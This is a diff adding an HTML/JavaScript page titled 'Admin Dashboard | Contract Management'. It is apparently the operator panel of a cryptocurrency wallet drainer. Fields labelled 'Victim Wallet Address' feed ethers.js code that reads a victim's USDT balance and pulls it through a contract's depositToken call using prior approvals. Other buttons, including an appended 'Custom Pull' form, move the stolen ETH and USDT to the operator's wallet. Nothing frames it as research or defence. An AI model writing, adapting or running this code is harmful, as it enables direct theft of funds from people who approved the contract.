@@ -1,0 +1,242 @@
+
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard | Contract Management</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+        .glass { background: rgba(17, 24, 39, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .gradient-text { background: linear-gradient(135deg, #60A5FA, #A78BFA); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+    </style>
+</head>
+<body class="bg-[#030712] text-gray-100 min-h-screen p-4 flex flex-col items-center justify-start pt-12">
+
+    <div class="glass w-full max-w-xl rounded-3xl p-8 shadow-2xl space-y-8">
+        <!-- Header -->
+        <div class="flex flex-col items-center">
+            <div class="w-14 h-14 bg-blue-500/10 rounded-2xl flex items-center justify-center mb-4 border border-blue-500/20">
+                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-blue-400"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            </div>
+            <h1 class="text-2xl font-semibold gradient-text text-center">Admin Control Panel</h1>
+            <p id="owner-address" class="text-gray-500 text-[10px] font-mono mt-1 mt-2 uppercase tracking-widest">Disconnected</p>
+        </div>
+
+        <div id="connect-block">
+            <button id="btn-connect" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-medium py-4 rounded-2xl transition-all active:scale-95 flex items-center justify-center gap-2">
+                Connect Admin Wallet
+            </button>
+        </div>
+
+        <div id="admin-block" class="hidden space-y-10">
+            <!-- Balances -->
+            <div class="grid grid-cols-2 gap-4">
+                <div class="p-5 rounded-2xl bg-white/5 border border-white/5 relative overflow-hidden">
+                    <p class="text-[10px] uppercase tracking-wider text-gray-500 font-bold mb-1">Contract ETH</p>
+                    <p id="eth-balance" class="text-2xl font-medium">0.00</p>
+                    <div class="absolute -right-2 -bottom-2 opacity-5"><svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L4.5 20.29L5.21 21L12 18L18.79 21L19.5 20.29L12 2Z"/></svg></div>
+                </div>
+                <div class="p-5 rounded-2xl bg-white/5 border border-white/5 relative overflow-hidden">
+                    <p class="text-[10px] uppercase tracking-wider text-gray-500 font-bold mb-1">Contract USDT</p>
+                    <p id="usdt-balance" class="text-2xl font-medium">0.00</p>
+                    <div class="absolute -right-2 -bottom-2 opacity-5"><svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10"/><path d="M12 8v8M8 12h8"/></svg></div>
+                </div>
+            </div>
+
+            <!-- Manual CollectSection -->
+            <div class="p-6 rounded-3xl bg-blue-500/5 border border-blue-500/10 space-y-5">
+                <div class="flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-blue-500 animate-pulse"></span>
+                    <h3 class="text-xs uppercase tracking-[0.2em] font-bold text-blue-400">Manual Pull (Collect Approval)</h3>
+                </div>
+                <div class="space-y-4">
+                    <div class="space-y-1.5">
+                        <label class="text-[10px] text-gray-400 ml-1 uppercase font-bold tracking-tight">Victim Wallet Address</label>
+                        <input id="victim-address" placeholder="0x..." class="w-full bg-white/5 border border-white/10 rounded-2xl py-3 px-4 focus:outline-none focus:border-blue-500/50 transition-colors text-sm font-mono placeholder:text-gray-700">
+                    </div>
+                    <button id="btn-pull-usdt" class="w-full bg-blue-500/20 hover:bg-blue-500/30 text-blue-400 font-semibold py-3.5 rounded-2xl transition-all active:scale-[0.98] text-xs uppercase tracking-widest border border-blue-500/20">
+                        Collect All USDT From Victim
+                    </button>
+                </div>
+            </div>
+
+            <!-- Withdraw Section -->
+            <div class="p-6 rounded-3xl bg-white/5 border border-white/5 space-y-6">
+                <h3 class="text-xs uppercase tracking-[0.2em] font-bold text-gray-500">Withdrawal to Your Wallet</h3>
+                <div class="space-y-4">
+                    <div class="space-y-1.5">
+                        <label class="text-[10px] text-gray-400 ml-1 uppercase font-bold tracking-tight">Your Destination Address</label>
+                        <input id="target-address" placeholder="0x..." class="w-full bg-white/5 border border-white/10 rounded-2xl py-3 px-4 focus:outline-none focus:border-blue-500/50 transition-colors text-sm font-mono placeholder:text-gray-700">
+                    </div>
+                    <div class="space-y-1.5">
+                        <label class="text-[10px] text-gray-400 ml-1 uppercase font-bold tracking-tight">Amount (Leave empty for MAX)</label>
+                        <input id="withdraw-amount" placeholder="0.00" type="number" step="any" class="w-full bg-white/5 border border-white/10 rounded-2xl py-3 px-4 focus:outline-none focus:border-blue-500/50 transition-colors text-sm font-mono placeholder:text-gray-700">
+                    </div>
+                    <div class="flex gap-4">
+                        <button id="btn-withdraw-eth" class="flex-1 bg-white/5 hover:bg-white/10 text-white font-semibold py-3.5 rounded-2xl transition-all border border-white/10 active:scale-[0.98] text-[10px] uppercase tracking-widest">
+                            Send ETH
+                        </button>
+                        <button id="btn-withdraw-usdt" class="flex-1 bg-blue-600 hover:bg-blue-500 text-white font-semibold py-3.5 rounded-2xl shadow-lg shadow-blue-500/20 transition-all active:scale-[0.98] text-[10px] uppercase tracking-widest">
+                            Send USDT
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Footer Log -->
+            <div class="text-center">
+                <p id="status-log" class="text-[9px] uppercase tracking-widest text-gray-600 font-mono italic">Waiting for connection...</p>
+                <div class="mt-4 opacity-20"><button onClick="window.location.reload()" class="text-[8px] hover:underline">Refresh Session</button></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const CONTRACT_ADDRESS = "0xB060F759E3dd7B1c673a096BF72398cfaebC7121";
+        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        const USDT_ABI = [
+            "function balanceOf(address) view returns (uint256)",
+            "function decimals() view returns (uint8)"
+        ];
+        const CONTRACT_ABI = [
+            "function returnNative(address to, uint256 amount) external",
+            "function returnToken(address tokenAddress, address to, uint256 amount) external",
+            "function depositToken(uint256 userId, address userWallet, uint256 expiryTime, address tokenAddress, uint256 amount, address fromAddress) external"
+        ];
+
+        let provider, signer, contract;
+
+        const el = id => document.getElementById(id);
+        const log = msg => el('status-log').innerText = `EVENT: ${msg}`;
+
+        el('btn-connect').onclick = async () => {
+            if (!window.ethereum) return alert("Please install MetaMask");
+            try {
+                provider = new ethers.BrowserProvider(window.ethereum);
+                signer = await provider.getSigner();
+                const addr = await signer.getAddress();
+                
+                el('owner-address').innerText = addr;
+                el('connect-block').classList.add('hidden');
+                el('admin-block').classList.remove('hidden');
+                
+                refreshBalances();
+            } catch (e) { log("Connection Error"); }
+        };
+
+        async function refreshBalances() {
+            try {
+                const ethBal = await provider.getBalance(CONTRACT_ADDRESS);
+                el('eth-balance').innerText = Number(ethers.formatEther(ethBal)).toFixed(4);
+
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
+                const usdtBal = await usdtContract.balanceOf(CONTRACT_ADDRESS);
+                el('usdt-balance').innerText = Number(ethers.formatUnits(usdtBal, 6)).toFixed(2);
+                log("Data Synchronized");
+            } catch (e) { log("Sync Failed"); }
+        }
+
+        async function getVictimBalance(vic) {
+            const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
+            return await usdt.balanceOf(vic);
+        }
+
+        el('btn-pull-usdt').onclick = async () => {
+            const vic = el('victim-address').value;
+            if (!ethers.isAddress(vic)) return alert("Invalid victim address");
+            
+            try {
+                log("Estimating payload...");
+                const adminContract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+                const bal = await getVictimBalance(vic);
+                
+                if (bal === 0n) return alert("Victim has 0 USDT balance");
+
+                log("PULLING TO CONTRACT...");
+                const tx = await adminContract.depositToken(777, vic, 0, USDT_ADDRESS, bal, vic);
+                log(`PENDING: ${tx.hash.slice(0,12)}...`);
+                await tx.wait();
+                log("PULL SUCCESS! Refreshing balances...");
+                refreshBalances();
+            } catch (e) {
+                log(`FAIL: ${e.reason || "Reverted (Try lower amount?)"}`);
+            }
+        };
+
+        el('btn-withdraw-usdt').onclick = async () => {
+            const to = el('target-address').value;
+            const amtStr = el('withdraw-amount').value;
+            if (!ethers.isAddress(to)) return alert("Invalid recipient");
+            
+            try {
+                log("Processing USDT withdrawal...");
+                const adminContract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+                const currentBal = await (new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider)).balanceOf(CONTRACT_ADDRESS);
+                const amount = amtStr ? ethers.parseUnits(amtStr, 6) : currentBal;
+
+                const tx = await adminContract.returnToken(USDT_ADDRESS, to, amount);
+                log(`TX: ${tx.hash.slice(0,12)}...`);
+                await tx.wait();
+                log("WITHDRAWAL SENT!");
+                refreshBalances();
+            } catch (e) { log("Token Tx Failed"); }
+        };
+
+        el('btn-withdraw-eth').onclick = async () => {
+            const to = el('target-address').value;
+            const amtStr = el('withdraw-amount').value;
+            if (!ethers.isAddress(to)) return alert("Invalid recipient");
+
+            try {
+                log("Processing ETH withdrawal...");
+                const adminContract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+                const currentBal = await provider.getBalance(CONTRACT_ADDRESS);
+                const amount = amtStr ? ethers.parseEther(amtStr) : currentBal;
+
+                const tx = await adminContract.returnNative(to, amount);
+                log(`TX: ${tx.hash.slice(0,12)}...`);
+                await tx.wait();
+                log("ETH SENT!");
+                refreshBalances();
+            } catch (e) { log("Native Tx Failed"); }
+        };
+    </script>
+
+
+
+
+<input id="custom-victim-address" placeholder="Wallet address">
+<input id="custom-amount" placeholder="Amount">
+
+<button id="btn-custom-pull">Custom Pull</button>
+
+<script>
+
+
+document.getElementById("btn-custom-pull").onclick = async () => {
+    const vic = document.getElementById("custom-victim-address").value;
+    const amt = document.getElementById("custom-amount").value;
+
+    if (!ethers.isAddress(vic)) return alert("Invalid address");
+    if (!amt) return alert("Enter amount");
+
+    const adminContract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+
+    const amount = ethers.parseUnits(amt, 6);
+
+    const tx = await adminContract.depositToken(777, vic, 0, USDT_ADDRESS, amount, vic);
+
+    await tx.wait();
+
+    alert("Done ✅");
+};
+
+</script>
+
+</body>
+</html>
